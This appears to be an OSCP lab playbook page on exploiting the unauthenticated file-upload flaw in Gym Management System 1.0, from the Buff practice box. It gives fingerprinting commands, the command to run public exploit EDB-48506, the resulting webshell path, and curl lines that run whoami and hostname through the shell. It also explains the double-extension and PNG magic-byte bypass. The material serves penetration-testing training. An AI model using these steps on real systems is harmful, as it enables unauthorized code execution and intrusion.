# Windows - Web - Gym Management Upload

**Step 23F of 50 · Windows**

*Exploit the unauthenticated upload handler in Gym Management System 1.0.*

## Run this

Fingerprint the application first:

~~~bash
curl -s http://$BoxIP:$WebPort/contact.php | grep -i 'gym\|manage\|system\|software'
searchsploit "Gym Management System"
~~~

EDB-48506 describes the upload logic. The request must contain the upload
submit field, an image Content-Type, and a filename whose final extension is
allowed but whose middle extension is PHP.

~~~bash
python2 $BoxDir/exploits/48506.py http://$BoxIP:$WebPort/
~~~

The PoC uploads a file named kaio-ken.php.png and requests the resulting
webshell at:

~~~text
http://$BoxIP:$WebPort/upload/kamehameha.php
~~~

Confirm the shell and current identity:

~~~bash
curl -s "http://$BoxIP:$WebPort/upload/kamehameha.php?telepathy=whoami"
curl -s "http://$BoxIP:$WebPort/upload/kamehameha.php?telepathy=hostname"
~~~

## What did you get?

- [ ] Gym Management Software 1.0 is identified → **Run EDB-48506 and confirm the returned webshell**
- [ ] The upload returns HTTP 200 but no shell → **Check the middle extension, final extension, Content-Type, submit field, and upload path**
- [ ] The shell executes as a Windows account → **Go to Step 27 · [[Windows - Shell Received]]**
- [ ] The upload handler is different → **Return to Step 23 · [[Windows - Web Enum]] and read the application source behaviour**

## Notes

The vulnerable handler uses the id parameter to select the upload basename and
uses the second element of a dot-separated filename as the extension. A filename
of kaio-ken.php.png therefore becomes kamehameha.php when id=kamehameha.

The PNG magic-byte prefix used by EDB-48506 is useful when the application checks
file content as well as the multipart MIME type. The PHP interpreter ignores
the short binary prefix before the PHP opening tag.

## Gotcha

> [!warning] 💡
> A successful upload response does not prove code execution. Request the exact
> resulting path and run whoami through the shell before attempting a callback.

## Seen in

- [[OSCP/BOXES/WRITE UPS/Windows/Buff|Buff]] -- unauthenticated Gym Management System upload

## Related stages

- [[Windows - Web Enum]]
- [[Windows - Exploit Search]]
- [[Windows - Shell Received]]

## External Resources

- [Exploit-DB 48506](https://www.exploit-db.com/exploits/48506)

## Why this matters for OSCP

This stage turns a page fingerprint into a controlled webshell and teaches why
filename parsing must be tested independently from the visible extension allow-list.
